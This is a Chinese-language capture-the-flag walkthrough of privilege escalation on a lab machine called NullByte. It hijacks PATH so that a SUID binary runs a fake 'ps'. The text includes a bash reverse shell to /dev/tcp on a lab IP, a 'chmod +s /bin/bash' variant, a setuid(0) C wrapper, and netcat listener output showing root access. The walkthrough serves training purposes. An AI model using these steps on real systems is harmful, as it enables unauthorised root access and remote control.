省去一堆步骤，

此时我拿到普通权限shell

ramses@NullByte:/var/www/backup$ ls -al
total 24
drwxrwxrwx 2 root   root   4096 Dec 13 06:54 .
drwxr-xr-x 4 root   root   4096 Aug  2  2015 ..
-rwsr-xr-x 1 root   root   4932 Aug  2  2015 procwatch
##发现了 名为procwach的文件，该文件具有suid权限。
ramses@NullByte:/var/www/backup$ file procwatch 
procwatch: setuid ELF 32-bit LSB executable ##并且是可执行的文件。
----------------------------------------------------------------
ramses@NullByte:/var/www/backup$ ./procwatch 
  PID TTY          TIME CMD
 1369 pts/0    00:00:00 procwatch
 1370 pts/0    00:00:00 sh
 1371 pts/0    00:00:00 ps
ramses@NullByte:/var/www/backup$ ps
  PID TTY          TIME CMD
 1350 pts/0    00:00:00 bash
 1372 pts/0    00:00:00 ps

##执行后， 分析该程序的作用是去运行ps命令。

----------------------------------------------------

##通过修改环境变量的方式，去篡改ps命令。

##第一步  将当前目录添加进PATH变量的第一个
ramses@NullByte:/var/www/backup$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

ramses@NullByte:/var/www/backup$ pwd
/var/www/backup
ramses@NullByte:/var/www/backup$ export PATH=/var/www/backup:$PATH
ramses@NullByte:/var/www/backup$ echo $PATH
/var/www/backup:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
----------------------------------------------------
##第二步  在本地创建ps文件，定义好内容，并赋予可执行权限。

ramses@NullByte:/var/www/backup$ cat ps
#!/bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.25/999 0>&1'

##上面只是一种方法，还有第二种如下
chmod +s /bin/bash


-rwxr-xr-x 1 ramses ramses   70 Dec 12 22:53 ps

----------------------------------------------------
##第三步  执行（我这里失败了，弹回的是普通权限shell）

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lvvp 999 
listening on [any] 999 ...
connect to [192.168.1.25] from NullByte.bbrouter [192.168.1.142] 36908
ramses@NullByte:/var/www/backup$ 
-------------------------------------
##分析原因
 具有suid权限，该文件本身确实是以root去执行的，但是程序内在调用ps命令的时候，却没有将ps命令执行的账户设置为root。所以会失败。
 elf文件是二进制文件，程序中未写入setuid函数去指定执行账户。

##解决办法
-----------------------------------

##第四步 创建如下文件

ramses@NullByte:/var/www/backup$ cat test.c 
#include<stdio.h>
int main(void) {
        setuid(0);  ##设置uid gid为0，设置为root账户 
        setgid(0);
        system("./shell");  #执行linux命令，运行名叫shell的文件。
        return 0 ; #固定语法，返回值 
}

ramses@NullByte:/var/www/backup$ gcc test.c -o ps
## 将之前的ps文件改成shell ，再把test.c 命名 ps ，赋予执行权限。
-------------------------------------------------------------
##第五步 执行

┌──(kali㉿kali)-[/tmp]
└─$ rlwrap nc -lvvp 999      
listening on [any] 999 ...
connect to [192.168.1.25] from NullByte.bbrouter [192.168.1.142] 36911
root@NullByte:/var/www/backup# 
##成功获取root权限。

--------------------------------

##梳理一下，
ps文件，c语言编译后的文件，内容是以root权限执行一段命令。
shell文件，里面有着所命令的内容，这个文件不是必要的，
procwatch文件，触发链的起点。


链条：当你执行prowatch文件后，你就具备了一定的root权限，通过path变量诱导，用root权限执行了ps文件，shell定义了ps执行的内容。
